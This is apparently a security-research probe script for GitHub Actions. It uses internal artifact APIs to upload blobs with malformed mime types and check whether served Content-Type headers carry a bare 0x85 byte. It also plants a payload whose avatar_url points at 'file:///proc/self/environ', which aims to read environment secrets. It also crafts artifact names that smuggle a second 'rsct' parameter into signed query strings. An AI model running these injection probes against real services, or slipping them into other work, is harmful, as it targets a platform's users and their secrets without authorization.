// Matrix: artifact version x mime_type shape -> does the SERVED Content-Type ever carry a bare 0x85?
// Key idea: no twirp encoding can transmit a bare 0x85 (both validate UTF-8), so the only way the
// byte can appear is Azure percent-DECODING an rsct that GitHub emitted without re-encoding '%'.
import https from 'node:https';
import { createHash } from 'node:crypto';
import { internalArtifactTwirpClient } from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids   = getBackendIdsFromToken();
const twirp = internalArtifactTwirpClient({ maxAttempts: 1 });
const RUN   = process.env.GITHUB_RUN_ID;
const REPO  = process.env.GITHUB_REPOSITORY;
const TOKEN = process.env.GH_TOKEN;
const NEL_CT = '\u0085application/json';

function req(url, { method = 'GET', headers = {}, body = null } = {}) {
  return new Promise((resolve, reject) => {
    const r = https.request(url, { method, headers }, res => {
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers,
                                    rawHeaders: res.rawHeaders, body: Buffer.concat(chunks) }));
    });
    r.on('error', reject);
    r.setTimeout(20000, () => r.destroy(new Error('timeout')));
    if (body) r.write(body);
    r.end();
  });
}
const hdrHex = (res, want) => {
  for (let i = 0; i < res.rawHeaders.length; i += 2)
    if (res.rawHeaders[i].toLowerCase() === want) return Buffer.from(res.rawHeaders[i + 1], 'latin1').toString('hex');
  return null;
};
const rawParam = (loc, key) => {                 // raw, UNdecoded query value
  const q = loc.slice(loc.indexOf('?') + 1);
  for (const kv of q.split('&')) { const i = kv.indexOf('='); if (kv.slice(0, i) === key) return kv.slice(i + 1); }
  return null;
};

const body = Buffer.from(JSON.stringify({ full_name: `${REPO}/x/zip`, owner: { login: 'c', avatar_url: 'file:///proc/self/environ' } }));

async function mint(label, version, mime, name) {
  const createReq = { workflowRunBackendId: ids.workflowRunBackendId,
                      workflowJobRunBackendId: ids.workflowJobRunBackendId, name, version };
  if (mime !== undefined) createReq.mimeType = StringValue.create({ value: mime });
  const c = await twirp.CreateArtifact(createReq);
  const up = await req(c.signedUploadUrl, { method: 'PUT', body,
    headers: { 'x-ms-blob-type': 'BlockBlob', 'content-length': String(body.length),
               'x-ms-version': '2021-08-06', 'x-ms-blob-content-type': NEL_CT } });
  const f = await twirp.FinalizeArtifact({ workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId, name, size: String(body.length) });
  const api = await req(`https://api.github.com/repos/${REPO}/actions/artifacts/${f.artifactId}/zip`, {
    headers: { accept: 'application/vnd.github.v3+json', authorization: `Bearer ${TOKEN}`, 'user-agent': 'probe' } });
  const loc = api.headers.location;
  const out = { label, version, mime, upload: up.status, artifactId: String(f.artifactId), apiStatus: api.status };
  if (!loc) return out;
  out.rsctRaw = rawParam(loc, 'rsct');
  out.rsctCount = (loc.match(/[?&]rsct=/g) || []).length;
  const blob = await req(loc, { headers: { 'user-agent': 'probe' } });
  out.blobStatus = blob.status;
  out.servedTypeHex = hdrHex(blob, 'content-type');
  out.has85 = !!(out.servedTypeHex && out.servedTypeHex.includes('85'));
  return out;
}

const MIMES = [
  ['valid',   'application/json'],
  ['pct85',   'application/json%85'],
  ['pct2585', 'application/json%2585'],
  ['nelC285', 'application/json\u0085'],
  ['param',   'application/json;charset=utf-8'],
  ['omitted', undefined],
];

for (const version of [4, 5, 6, 7, 8]) {
  for (const [mlabel, mime] of MIMES) {
    const label = `v${version}-${mlabel}`;
    try { console.log('MATRIX ' + JSON.stringify(await mint(label, version, mime, `m-${label}-${RUN}`))); }
    catch (e) { console.log('MATRIX ' + JSON.stringify({ label, version, mime, error: String(e?.message || e).slice(0, 170) })); }
  }
}

// Can the artifact NAME inject a second rsct into the signed query? (name lands in rscd)
for (const [nlabel, nm] of [['amp', `inj-${RUN}&rsct=%2585application%252Fjson`],
                            ['amp-plain', `inj2-${RUN}&rsct=application%252Fjson`]]) {
  try { console.log('NAMEINJ ' + JSON.stringify(await mint(`name-${nlabel}`, 7, 'application/json', nm))); }
  catch (e) { console.log('NAMEINJ ' + JSON.stringify({ label: nlabel, error: String(e?.message || e).slice(0, 170) })); }
}
